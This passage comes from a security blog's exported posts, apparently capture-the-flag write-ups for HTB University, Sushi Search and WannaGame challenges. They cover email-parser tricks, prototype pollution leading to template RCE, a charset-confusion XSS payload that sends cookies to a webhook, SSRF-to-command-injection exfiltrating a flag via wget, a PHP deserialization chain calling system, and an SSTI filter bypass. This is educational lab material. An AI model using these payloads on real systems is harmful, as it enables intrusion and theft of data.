example\u0026rdquo;\u0026lt;bop@example.com\u0026gt; ? This looks really weird at first sight. With the text in \u0026quot;\u0026quot; is a name of domain. Read more , we will see that the server again use other library to send email which is NodeMailer const transporter = nodemailer.createTransport({ host: \u0026#34;127.0.0.1\u0026#34;, port: 1025, secure: false, }); const sendVerificationEmail = async (email, code) =\u0026gt; { const mailOptions = { from: \u0026#34;no-reply@interstellar.htb\u0026#34;, to: email, subject: \u0026#34;Email Verification\u0026#34;, html: `Your verification code is: ${code}`, }; try { await transporter.sendMail(mailOptions); console.log(`Verification email sent to ${email}`); } catch (error) { console.error(\u0026#34;Error sending email:\u0026#34;, error); throw new Error(\u0026#34;Unable to send verification email\u0026#34;); } }; Then i try this payload and it works.((I will explain later)) email :\u0026#39; \u0026#34;test@email.htb\u0026#34; @interstellar.htb\u0026#39; But this wont work ( JUST A SPACE )\nemail :\u0026#39; \u0026#34;test@email.htb\u0026#34;@interstellar.htb\u0026#39; This abuse the differences in ways of 2 library parses out our address !!! This will trickyly send to our email kkk !!!\nMoreover, in logic requests it seems something vulnerable when setting the default value without actually block it ! We can get admin privilege from this ! const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; Now we try this : Register with role admin : Login with opt code received from email page: Now we are admins !!! # Let find out what we can do now . We have just some thing interesting ! const transmitAPI = async (req, res) =\u0026gt; { const { url } = req.body; if (!url) { return res.status(400).json({ message: \u0026#34;URL is required\u0026#34; }); } const responseBody = await fetchURL(url); res.status(200).json({ message: \u0026#34;Request successful\u0026#34;, responseBody, }); }; const editBountiesAPI = async (req, res) =\u0026gt; { const { ...bountyData } = req.body; try { const data = await BountyModel.findByPk(req.params.id, { attributes: [ \u0026#34;target_name\u0026#34;, \u0026#34;target_aliases\u0026#34;, \u0026#34;target_species\u0026#34;, \u0026#34;last_known_location\u0026#34;, \u0026#34;galaxy\u0026#34;, \u0026#34;star_system\u0026#34;, \u0026#34;planet\u0026#34;, \u0026#34;coordinates\u0026#34;, \u0026#34;reward_credits\u0026#34;, \u0026#34;reward_items\u0026#34;, \u0026#34;issuer_name\u0026#34;, \u0026#34;issuer_faction\u0026#34;, \u0026#34;risk_level\u0026#34;, \u0026#34;required_equipment\u0026#34;, \u0026#34;posted_at\u0026#34;, \u0026#34;status\u0026#34;, \u0026#34;image\u0026#34;, \u0026#34;description\u0026#34;, \u0026#34;crimes\u0026#34;, \u0026#34;id\u0026#34;, ], }); if (!data) { return res.status(404).json({ message: \u0026#34;Bounty not found\u0026#34; }); } const updated = mergedeep(data.toJSON(), bountyData); await data.update(updated); return res.json(updated); } catch (err) { console.log(err); return res.status(500).json({ message: \u0026#34;Error fetching data\u0026#34; }); } }; We will have 2 main controllers :\nTransmit API will make a requests to our given url with needle library ? It looks really weird and maybe some hints of this ctf. EditBountyApis will merge our data with an object ?? Damn, its really clear that here is an Prototype Pollution attack and we need to find some gadgets and maybe it will be exist in the needle. const fetchURL = async (url) =\u0026gt; { if (!url.startsWith(\u0026#34;http://\u0026#34;) \u0026amp;\u0026amp; !url.startsWith(\u0026#34;https://\u0026#34;)) { throw new Error(\u0026#34;Invalid URL: URL must start with http or https\u0026#34;); } const options = { compressed: true, follow_max: 0, }; return new Promise((resolve, reject) =\u0026gt; { needle.get(url, options, (err, resp, body) =\u0026gt; { if (err) { return reject(new Error(\u0026#34;Error fetching the URL: \u0026#34; + err.message)); } resolve(body); }); }); }; The needle will call get with url , options ,and a callbacks. After reading the needle library, it seems interesting here. We can use the attribute output to write a any file !!!! So combine this with the prototype pollution we can achive this easily with :\n\u0026#34;__proto__\u0026#34;:{ \u0026#34;output\u0026#34;:\u0026#34;/app/views/index.html\u0026#34; } // Write into template files to receive easily Lets polluted the options : Now whatever we receive from the calling transmit API will be stored in /app/views/index.html which we can see it !!!Just host a simple page with the payload :\n{{range.constructor(\u0026#34;return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;tail /flag.txt\u0026#39;)\u0026#34;)()}} Finally, send this through our url . We overwrite this !!! Now lets check the index.html Ehh ?? It looks unupdated :vv But in docker it get changed !! Maybe we need to triger and update in our app In the config :\n[program:node] directory=/app command=node index.js autostart=true autorestart=true stdout_logfile=/dev/stdout stdout_logfile_maxbytes=0 stderr_logfile=/dev/stderr stderr_logfile_maxbytes=0 Our app is allowed to restart, so we need to trigger this. We need to make a crash or execption.\nconst transmitAPI = async (req, res) =\u0026gt; { const { url } = req.body; if (!url) { return res.status(400).json({ message: \u0026#34;URL is required\u0026#34; }); } const responseBody = await fetchURL(url); res.status(200).json({ message: \u0026#34;Request successful\u0026#34;, responseBody, }); }; We can abuse this because it doesnt catch any exception. Just send random URL ANd get the FLAGGGGGGG Thats the end of challenge :v Research about NodeMailer behaviours # Now I will explain why our email works. email = \u0026#34;test@email.htb\u0026#34; @interstellar.htb I read the source code of nodemailer to figure out this. You could try too at here. I wont refer to the way of express-addresses work because it just follow the RFC 5322 and our email will be parsed with domain \u0026ldquo;@interstellar.htb\u0026rdquo; as expected. So I just focus on the nodemailer Main steps # First the command will tokenize our address with following code: class Tokenizer { constructor(str) { this.str = (str || \u0026#39;\u0026#39;).toString(); this.operatorCurrent = \u0026#39;\u0026#39;; this.operatorExpecting = \u0026#39;\u0026#39;; this.node = null; this.escaped = false; this.list = []; /** * Operator tokens and which tokens are expected to end the sequence */ this.operators = { \u0026#39;\u0026#34;\u0026#39;: \u0026#39;\u0026#34;\u0026#39;, \u0026#39;(\u0026#39;: \u0026#39;)\u0026#39;, \u0026#39;\u0026lt;\u0026#39;: \u0026#39;\u0026gt;\u0026#39;, \u0026#39;,\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;:\u0026#39;: \u0026#39;;\u0026#39;, // Semicolons are not a legal delimiter per the RFC2822 grammar other // than for terminating a group, but they are also not valid for any // other use in this context. Given that some mail clients have // historically allowed the semicolon as a delimiter equivalent to the // comma in their UI, it makes sense to treat them the same as a comma // when used outside of a group. \u0026#39;;\u0026#39;: \u0026#39;\u0026#39; }; } /** * Tokenizes the original input string * * @return {Array} An array of operator|text tokens */ tokenize() { let list = []; for (let i = 0, len = this.str.length; i \u0026lt; len; i++) { let chr = this.str.charAt(i); let nextChr = i \u0026lt; len - 1 ? this.str.charAt(i + 1) : null; this.checkChar(chr, nextChr); } this.list.forEach(node =\u0026gt; { node.value = (node.value || \u0026#39;\u0026#39;).toString().trim(); if (node.value) { list.push(node); } }); return list; } /** * Checks if a character is an operator or text and acts accordingly * * @param {String} chr Character from the address field */ checkChar(chr, nextChr) { if (this.escaped) { // ignore next condition blocks } else if (chr === this.operatorExpecting) { this.node = { type: \u0026#39;operator\u0026#39;, value: chr }; if (nextChr \u0026amp;\u0026amp; ![\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;;\u0026#39;].includes(nextChr)) { this.node.noBreak = true; } this.list.push(this.node); this.node = null; this.operatorExpecting = \u0026#39;\u0026#39;; this.escaped = false; return; } else if (!this.operatorExpecting \u0026amp;\u0026amp; chr in this.operators) { this.node = { type: \u0026#39;operator\u0026#39;, value: chr }; this.list.push(this.node); this.node = null; this.operatorExpecting = this.operators[chr]; this.escaped = false; return; } else if ([\u0026#39;\u0026#34;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;].includes(this.operatorExpecting) \u0026amp;\u0026amp; chr === \u0026#39;\\\\\u0026#39;) { this.escaped = true; return; } if (!this.node) { this.node = { type: \u0026#39;text\u0026#39;, value: \u0026#39;\u0026#39; }; this.list.push(this.node); } if (chr === \u0026#39;\\n\u0026#39;) { // Convert newlines to spaces. Carriage return is ignored as \\r and \\n usually // go together anyway and there already is a WS for \\n. Lone \\r means something is fishy. chr = \u0026#39; \u0026#39;; } if (chr.charCodeAt(0) \u0026gt;= 0x21 || [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;].includes(chr)) { // skip command bytes this.node.value += chr; } this.escaped = false; } } It splits our data into an token array :\nIt will split the \u0026quot; as a operator and our text is just text :v. Then put this token through _handleAddress function. The logic is really simple and comment makes it readable. function _handleAddress(tokens) { let isGroup = false; let state = \u0026#39;text\u0026#39;; let address; let addresses = []; let data = { address: [], comment: [], group: [], text: [] }; let i; let len; // Filter out \u0026lt;addresses\u0026gt;, (comments) and regular text for (i = 0, len = tokens.length; i \u0026lt; len; i++) { let token = tokens[i]; let prevToken = i ? tokens[i - 1] : null; if (token.type === \u0026#39;operator\u0026#39;) { switch (token.value) { case \u0026#39;\u0026lt;\u0026#39;: state = \u0026#39;address\u0026#39;; break; case \u0026#39;(\u0026#39;: state = \u0026#39;comment\u0026#39;; break; case \u0026#39;:\u0026#39;: state = \u0026#39;group\u0026#39;; isGroup = true; break; default: state = \u0026#39;text\u0026#39;; break; } } else if (token.value) { if (state === \u0026#39;address\u0026#39;) { // handle use case where unquoted name includes a \u0026#34;\u0026lt;\u0026#34; // Apple Mail truncates everything between an unexpected \u0026lt; and an address // and so will we token.value = token.value.replace(/^[^\u0026lt;]*\u0026lt;\\s*/, \u0026#39;\u0026#39;); } if (prevToken \u0026amp;\u0026amp; prevToken.noBreak \u0026amp;\u0026amp; data[state].length) { // join values data[state][data[state].length - 1] += token.value; } else { data[state].push(token.value); } } } // If there is no text but a comment, replace the two if (!data.text.length \u0026amp;\u0026amp; data.comment.length) { data.text = data.comment; data.comment = []; } if (isGroup) { // http://tools.ietf.org/html/rfc2822#appendix-A.1.3 data.text = data.text.join(\u0026#39; \u0026#39;); addresses.push({ name: data.text || (address \u0026amp;\u0026amp; address.name), group: data.group.length ? addressparser(data.group.join(\u0026#39;,\u0026#39;)) : [] }); } else { // If no address was found, try to detect one from regular text if (!data.address.length \u0026amp;\u0026amp; data.text.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { if (data.text[i].match(/^[^@\\s]+@[^@\\s]+$/)) { data.address = data.text.splice(i, 1); break; } } let _regexHandler = function (address) { if (!data.address.length) { data.address = [address.trim()]; return \u0026#39; \u0026#39;; } else { return address; } }; // still no address if (!data.address.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { // fixed the regex to parse email address correctly when email address has more than one @ data.text[i] = data.text[i].replace(/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/, _regexHandler).trim(); if (data.address.length) { break; } } } } // If there\u0026#39;s still is no text but a comment exixts, replace the two if (!data.text.length \u0026amp;\u0026amp; data.comment.length) { data.text = data.comment; data.comment = []; } // Keep only the first address occurence, push others to regular text if (data.address.length \u0026gt; 1) { data.text = data.text.concat(data.address.splice(1)); } // Join values with spaces data.text = data.text.join(\u0026#39; \u0026#39;); data.address = data.address.join(\u0026#39; \u0026#39;); if (!data.address \u0026amp;\u0026amp; isGroup) { return []; } else { address = { address: data.address || data.text || \u0026#39;\u0026#39;, name: data.text || data.address || \u0026#39;\u0026#39; }; if (address.address === address.name) { if ((address.address || \u0026#39;\u0026#39;).match(/@/)) { address.name = \u0026#39;\u0026#39;; } else { address.address = \u0026#39;\u0026#39;; } } addresses.push(address); } } return addresses; } I will explain this : STEP 1: It create a data object to store all infomations we have. let data = { address: [], comment: [], group: [], text: [] }; Step2 : Read the token and read the type of it to set the stage and decide where the following data pushed into the data list.\nfor (i = 0, len = tokens.length; i \u0026lt; len; i++) { let token = tokens[i]; let prevToken = i ? tokens[i - 1] : null; if (token.type === \u0026#39;operator\u0026#39;) { switch (token.value) { case \u0026#39;\u0026lt;\u0026#39;: state = \u0026#39;address\u0026#39;; break; case \u0026#39;(\u0026#39;: state = \u0026#39;comment\u0026#39;; break; case \u0026#39;:\u0026#39;: state = \u0026#39;group\u0026#39;; isGroup = true; break; default: state = \u0026#39;text\u0026#39;; break; } You can see it just check the \u0026ldquo;\u0026lt;\u0026rdquo; at first to decide which one is address so our data wont be caught here!. Then is some uninteresting features. Until this :\n// If no address was found, try to detect one from regular text // This will run because we dont use \u0026lt; \u0026gt; format if (!data.address.length \u0026amp;\u0026amp; data.text.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { if (data.text[i].match(/^[^@\\s]+@[^@\\s]+$/)) { data.address = data.text.splice(i, 1); break; } } let _regexHandler = function (address) { if (!data.address.length) { data.address = [address.trim()]; return \u0026#39; \u0026#39;; } else { return address; } }; // still no address // Here we step into this if (!data.address.length) { for (i = data.text.length - 1; i \u0026gt;= 0; i--) { // fixed the regex to parse email address correctly when email address has more than one @ data.text[i] = data.text[i].replace(/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/, _regexHandler).trim(); if (data.address.length) { break; } } } Author comments make me know what to do here. If there isn\u0026rsquo;t the address parsed, It will use regrex to find our email. First regrex is : for (i = data.text.length - 1; i \u0026gt;= 0; i--) { if (data.text[i].match(/^[^@\\s]+@[^@\\s]+$/)) { data.address = data.text.splice(i, 1); break; } } Then test it : You can see that it just read the first pattern match email. This is the reason why our payload works !!!! The last try will check the final regrex is : data.text[i] = data.text[i].replace(/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/, _regexHandler).trim(); It will find the pattern and call the callback which will push that pattern into the address !!!!\nLET\u0026rsquo;S ANSWER THE QUESTIONS # The difference between ?\nemail :\u0026#39; \u0026#34;test@email.htb\u0026#34; @interstellar.htb\u0026#39; But this wont work ( JUST A SPACE )\nemail :\u0026#39; \u0026#34;test@email.htb\u0026#34;@interstellar.htb\u0026#39; When tokenized it will be something different :\nYou see it right ? The noBreak makes the second one cannot work. It will be set by this logic :\nif (nextChr \u0026amp;\u0026amp; ![\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;;\u0026#39;].includes(nextChr)) { this.node.noBreak = true; } When noBreak is enabled, it wont push our text token into array, but it will JOIN with the previous value. if (prevToken \u0026amp;\u0026amp; prevToken.noBreak \u0026amp;\u0026amp; data[state].length) { // join values data[state][data[state].length - 1] += token.value; } else { data[state].push(token.value); } And leads to the wrong email detected !! Conclusion # I learned alot from this challenge, and read this makes me can understand more how the payloads created. :vvv ","date":"27 August 2024","externalUrl":null,"permalink":"/posts/htb/","section":"Posts","summary":"Write ups HTB UNIVERSITY # Web armaxis # Logic is only thing\nOverview : # We are given a page and a email host to receive OTP. Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.\nrouter.post(\u0026#34;/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; // Added \u0026#39;email\u0026#39; parameter if (!","title":"Hack The Box University 2024","type":"posts"},{"content":" Sushi Search # Read this before : Blog\nType: Xss through missing charset\nChromium detect engine This is really hard to me , and i just can solve after reading script :v SOURCE CODE : # This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss. But \u0026hellip;. :::danger They sanitize it with DomPurify at newest version ! ::: Pay attention in this code : It doesnt specify an charset which lead to vulnerabilities. Which leads to the wrong encoding heres of sushi emoji. But i read this blog and i found a way to bypass. If we can someway to fool chrome engine to detect the charset as ISO_2022_JP, we can bypass easily with. /search?search= \u0026lt;a id=\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1B(B \u0026lt;a id=\u0026#34;\u0026gt;\u0026lt;img src=x onerror = fetch(`YOUR-WEB-HOOK?a=document.cookie`)\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1b$B %1b(B \u0026lt;repeat 1000 times\u0026gt; I cannot explain better the blog so read it :vvv .This is a valid DOM and dompurify wont sanitize this and then chrome parse it as ISO_2022_JP BOOOOOOOOOOOOOOOOOOOOOOM We get xss :) HARDEST THING # THE HARDEDST QUESTION IS HOW CHROME DETECT IT ? # Maybe you can just put a lot of bunchs of %1b$B and %1b(B and hope chrome detect it :vv There is something weird here when i try my exploit # /search?search= \u0026lt;a id=\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1B(B \u0026lt;a id=\u0026#34;\u0026gt;\u0026lt;img src=x onerror = alert(1) \u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;%1b$B %1b(B \u0026lt;repeat 10000 times\u0026gt; /search?search= \u0026lt;a id=\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; %1B(B \u0026lt;a id=\u0026#34;\u0026gt;\u0026lt;img src=x onerror = alert(1111111111111111111111111)\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;%1b$B %1b(B \u0026lt;repeat 10000 times\u0026gt; Both of codes is just different at the length of alert right ? ====== But (1) not works :vv ====== And (2) give me this -\u0026gt; chrome detect success ??\nIt took me one day confusing and I decide to read chromium source code (in fact shin24 tells me :vv)\nCHROME DETECT ENGINE # It is too long to tell how the engine works but i will tell a little bit :::warning I just tell the way i understand because of so many blackbox. ::: Its like a game of bunch encodings. Anyone has their own scores. Boost and Whack scores is main feature and the best will be chosen one. SLOW SCAN ( Which detects the ISO_2022_JP ) # It will scan 16KB of document and if it doesn\u0026rsquo;t find any encodings, it will fast scan (256kb) which we dont talk about .\nSlow can will check only the interesting byte \u0026lt; 0x80 and 0x1b is in that case.\nHere is the scan_table it use to detect if that byte it interesting or not. (!=0 -\u0026gt; interesting)\nSo if it meets a interesting byte. First it will check if that bytes is inside a or or comment. If inside a title tag , it will be decreased the score it can boost, then skip to the end of tag just in case there is 12 bytes in title already. Pay attention that in our case my input actually push into the title tag too. However, there is something funny here when reading more the logic check tag It loops back 192 bytes to find the \u0026ldquo;\u0026lt;\u0026rdquo; and \u0026ldquo;\u0026gt;\u0026rdquo; . Yeah like i say \u0026ldquo;192\u0026rdquo; bytes. So if you pad a bunch of \u0026ldquo;a\u0026rdquo; before your \u0026ldquo;%1b\u0026rdquo; , it won\u0026rsquo;t be considered inside a title tag and they wont be skipped to tag end + keep full score weightshift !!!\nIt seems the reason why exploit 2 works . Now let\u0026rsquo;s dive deeper\nANOTHER QUESTION # BUT why we want to keep a bunch of data in title ? When we can place it here ? Is it scored the same ???? The fact is NO! # In short, one scan just check 8 pairs of interesting bytes then pruning. If something get pruned , it is done and no get checked any more!!! And we dont want this If the number of pairs is not divided by 8 , no boostPrune will happend Max pairs scanned === 48 pairs SO what is matter ? # The KEY IS THAT SUSHI !! That emoji in bytes is 0xF0 0xF8 0x8a 0xa3 (take 4 bytes) And if we look at the logic to boost\nLogic to whack BOOST a little and WHACK SO MUCH ! :vv First i think it not matter because 0xF0 is bigger than 0x1F right ? But when i try to debug, it happens, the 0xF0 is \u0026lt; 0x1F and it whack our score so much!! *I still dont make sense maybe because of signed number :v SO the emoji whacking us too much !!! ===\u0026raquo;\u0026gt; If we put data after sushi , there is no way to continue checking ISO due to pruned\nMATH TIMEEEE # In case we have 7 pair boost and 1 pair whack from sushi emoji BoostGentle = 60 WhackBadPair = 600 Score = BOOST - WHACK = 7*60 - 600 = -180 points So we dont want to have any emoji get scanned pairs !! \u0026mdash;\u0026gt; If we set at title , it will get enough pairs before getting the sushi emoji Conclusion # That is the reason we want to trim out the sushi emoji. And we need the assistance of title tag. This challenge is really hard :vv MORE # I test in locally and it works with append a bunch of \u0026ldquo;a\u0026rdquo; and 8 pairs of \u0026ldquo;\\x1b$B\\x1b(B\u0026rdquo; so i hope its true :vv\nv WELL WELL TEST KNOWLEDGE # If you understand you will know what happen if i put this sushi in another place @@ \u0026mdash;\u0026gt; It will be ISO_2022_JP :vvv\n","date":"27 August 2024","externalUrl":null,"permalink":"/posts/sushi/","section":"Posts","summary":"Sushi Search # Read this before : Blog\nType: Xss through missing charset\nChromium detect engine This is really hard to me , and i just can solve after reading script :v SOURCE CODE : # This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss. But \u0026hellip;. :::danger They sanitize it with DomPurify at newest version !","title":"Sushi Search and Chrome Detect Engine","type":"posts"},{"content":" Write ups WannaGame # Dox List: # Source code : # CVE-2024-42352: https://nvd.nist.gov/vuln/detail/CVE-2024-42352\nServer :\n@app.route(\u0026#39;/health_check\u0026#39;) def health_check(): cmd = request.args.get(\u0026#39;cmd\u0026#39;) or \u0026#39;ping\u0026#39; health_check = f\u0026#39;echo \\\u0026#39;db.runCommand(\u0026#34;{cmd}\u0026#34;).ok\\\u0026#39; | mongosh mongodb:27017/app --quiet\u0026#39; try: result = subprocess.run(health_check, shell=True, capture_output=True, text=True, timeout=2) app.logger.info(result) return \u0026#39;Database is responding\u0026#39; if \u0026#39;1\u0026#39; in result.stdout else \u0026#39;Database is not responding\u0026#39; except subprocess.TimeoutExpired: return \u0026#39;Database is not responding\u0026#39; @app.route(\u0026#39;/api/dogs\u0026#39;) def get_dogs(): app.logger.info(f\u0026#34;Requests Header : {request.headers}\u0026#34;) dogs = [] for dog in app_db[\u0026#39;doxlist\u0026#39;].find(): dogs.append({ \u0026#34;name\u0026#34;: dog[\u0026#39;name\u0026#39;], \u0026#34;image\u0026#34;: dog[\u0026#39;image\u0026#39;] }) return jsonify(dogs) We have two routes, one for get data from db and one to call a command with subprocess.run. Because it is running with : shell = True so we can use something like : cat /flag* to receive the flag and call to our web hooks.\nClient :\n\u0026lt;script setup\u0026gt; import { ref, onMounted } from \u0026#39;vue\u0026#39;; const delay = ms =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)) const cards = ref(new Array(8)) const { data, error } = await useAsyncData(\u0026#39;fetchDox\u0026#39;, async () =\u0026gt; { try { const response = await $fetch(\u0026#39;http://backend:5000/api/dogs\u0026#39;) console.log(response) return response } catch (err) { console.error(\u0026#39;Error fetching data:\u0026#39;, err) return cards; } }) onMounted(async () =\u0026gt; { console.log(data) if (data) cards.value = data.value; console.log(cards) }); Well it looks like server just call to the the \u0026ldquo;/api/dogs\u0026rdquo;\u0026hellip; Im trying to figure out some way to ssrf this app and its too hard. So we have a hint from authors So now , we just need to find a CVE which we can just check version of packages in our app.\n\u0026#34;dependencies\u0026#34;: { \u0026#34;@nuxt/icon\u0026#34;: \u0026#34;1.4.4\u0026#34;, \u0026#34;@nuxtjs/proxy\u0026#34;: \u0026#34;^2.1.0\u0026#34;, \u0026#34;nuxt\u0026#34;: \u0026#34;^3.13.0\u0026#34;, \u0026#34;vue\u0026#34;: \u0026#34;latest\u0026#34;, \u0026#34;vue-router\u0026#34;: \u0026#34;latest\u0026#34; }, Ye , there is only one unupdated is @nuxt/icon. Search on google and we will find this. And we try to test this on our app. Now we can call to the route right ??? Nope, its seem impossible\nLook at the implementation of url parse we can know the reason why. Our url will be catched with the basename \u0026ldquo;/\u0026rdquo; and then i tried some bypass with \u0026ldquo;\u0026quot; and \u0026ldquo;%5C\u0026rdquo; but it is impossilbe so we need to find another way. Take a breathe, and we can control the place our server will redirect to right ? So the idea is really simple !!! Make it redirect to our own app !!! And we can just redirect it back to its route (\u0026quot;/health_check\u0026rdquo;) Implement own server # from flask import Flask,request,redirect import requests app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return redirect(\u0026#34;http://backend:5000/health_check?cmd=%22%29%27%3Bwget%20https%3A%2F%2Fwebhook.site%2F8e85705e-3468-4e1f-90b5-745c2a70b808%3Fq%3D%24%28cat%20%2Fflag%2A%29%20%3Becho%20%271%27%3B%23%20\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) # This runs the app locally Host this app up and we will receive the flag at our webhook !! Im sorry for not showing the real flag because I dont know why i cannot access it anymore :\u0026lt;.\nMy Restaurant # Insecure Deserialization\nOverview # class Spaghetti { public $sauce; public $noodles; public $portion; public function __get($tomato) { ($this-\u0026gt;sauce)(); } } class Pizza { public $price; public $cheese; public $size; public function __destruct() { echo $this-\u0026gt;size-\u0026gt;what; } } \u0026lt;?php class IceCream { public $flavors; public $topping; public function __invoke() { foreach ($this-\u0026gt;flavors as $flavor) { echo $flavor; } } } This challenge gives us 3 class and this is 100% a PHP deserialization challenge !! So we need to find some ways to chain these vulnerabilities. I rearranged for easier explanation.\nFirst class is Spaghetti use method __get($tomato) is a method get called when we get access into a undefined attribute of that class. And it will run the function at sauce Second class is Pizza use method __destruct is a method get called when this class is destructed. Then it will call to the $size-\u0026gt;what. Final class IceCream use method __invoke is a method get called when get called like $ice();. It will loops and print the flavors array. What we can chain here ? # Look at the Pizza, it will access to an undefined variables what right? So if we set our $size is a object of Spaghetti which has __get($tomato) get called when access to undefined attribute ? We can chain these together then we can run the $sauce of Spaghetti. What the $sauce should be ? It is clear is the IceCream !!! And it will run the __invoke and print its flavors !!! What flavors we want ? # So now we can make some chain, to finally run the __invoke to print out all flavors. Well a $flavors in IceCream is just an array and in the source code we have something interesting : \u0026lt;?php namespace Helpers{ use \\ArrayIterator; class ArrayHelpers extends ArrayIterator { public $callback; public function current() { $value = parent::current(); echo $value; $debug = call_user_func($this-\u0026gt;callback, $value); return $value; } } } This creates a Helpers Array which add a function when get looped with forEach. It will loop through the values in array and call a callback with argument is that value !!!! Which is so suitable to create our $flavours right ? Because the $flavours get looped too !!.\nforeach ($this-\u0026gt;flavors as $flavor) { echo $flavor; } Full steps : # $pizza = new Pizza(); $spa = new Spaghetti(); $ice = new IceCream(); //Set the values is a malicous code $arrayHel = new ArrayHelpers([\u0026#34;cat /*.txt\u0026#34;]); // Set callback to system function to exec code $arrayHel-\u0026gt;callback=\u0026#34;system\u0026#34;; // Chain methods $ice-\u0026gt;flavors = $arrayHel; $spa-\u0026gt;sauce = $ice; $pizza-\u0026gt;size = $spa; echo serialize($pizza); echo base64_encode(serialize($pizza)); Test it on burp suite we get : Hmmm it seems not get the ArrayHelpers instance because this class comes from another file. Just fix a little bit with : Run again and get the flag !!!! SSTI FOR KIDS : # def check_payload(payload): forbidden_chars = [\u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;x\u0026#34;, \u0026#34;dict\u0026#34;, \u0026#34;config\u0026#34;, \u0026#34;mro\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;debug\u0026#34;, \u0026#34;cycler\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;flag\u0026#34;, \u0026#34;cat\u0026#34;] # [] , payload = payload.lower() for char in forbidden_chars: if char in payload: print(f\u0026#34;CAUGHT {char}\u0026#34;) return True return False This challenge need us to bypass SSTI checker. After reading this blog\nI found a powerful payload : {{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;id\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} But it stills get caught with x letter so just convert all of them into octal form :\u0026raquo;\n{{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\137\\137globals\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137builtins\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137import\\137\\137\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;id\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} Then change some blackwords too: Final :\n{{request|attr(\u0026#39;\\141pplic\\141ti\\157n\u0026#39;)|attr(\u0026#39;\\137\\137glob\\141ls\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137builtins\\137\\137\u0026#39;)|attr(\u0026#39;\\137\\137getitem\\137\\137\u0026#39;)(\u0026#39;\\137\\137imp\\157rt\\137\\137\u0026#39;)(\u0026#39;\\157s\u0026#39;)|attr(\u0026#39;p\\157pen\u0026#39;)(\u0026#39;c\\141t fl\\141g*\u0026#39;)|attr(\u0026#39;re\\141d\u0026#39;)()}} Ten ten ten: Nemo # Logic and read memories\nSource Back End: # class FileMetadata: def __init__( self, author, filename, description, id = None, ): if len(author) \u0026gt; 50 or \\ len(filename) \u0026gt; 50 or \\ len(description) \u0026gt; 150: raise StringTooLongException() self.creation_time = datetime.now(tz=timezone.utc) self.author = author self.filename = filename self.init = id in forbidden_ids basedir = \u0026#34;/company\u0026#34; if self.init else \u0026#34;/tmp\u0026#34; self.path = f\u0026#34;{basedir}/{filename}\u0026#34; self.description = description self.id = str(UUID(id, version=4)) if id is not None else str(uuid4()) def write(self, collection, content): raise ValueError(\u0026#34;Use of forbidden id\u0026#34;) collection.insert_one(vars(self)) if \u0026#34;./\u0026#34; in self.path: raise PathTraversalAttemptDetectedException() if len(content) \u0026gt; 200: raise FileTooBigException() with open(self.path, \u0026#34;w\u0026#34;) as f: f.write(content) def read(self, offset, length): with open(self.path, \u0026#34;rb\u0026#34;) as f: f.seek(offset) return f.read(length) First it wil create a FileMeta with 2 main functions:\nWrite and Read There are also some rules need to follow. First it will check the id given and check if it is forbiddened or not. After that choose a basedir to store that file (\u0026rsquo;/tmp\u0026rsquo; or \u0026lsquo;/company\u0026rsquo;). Finally initialize a uuid if no id given and check the format of id given. Pay attention that read function using offset and length to read a file which looks too weird. Well it looks too much information here. But left it and read at the server code . Source Handle : # def initialize_db(): for f in files: m = f[\u0026#34;metadata\u0026#34;] fm = FileMetadata( m[\u0026#34;author\u0026#34;], m[\u0026#34;filename\u0026#34;], 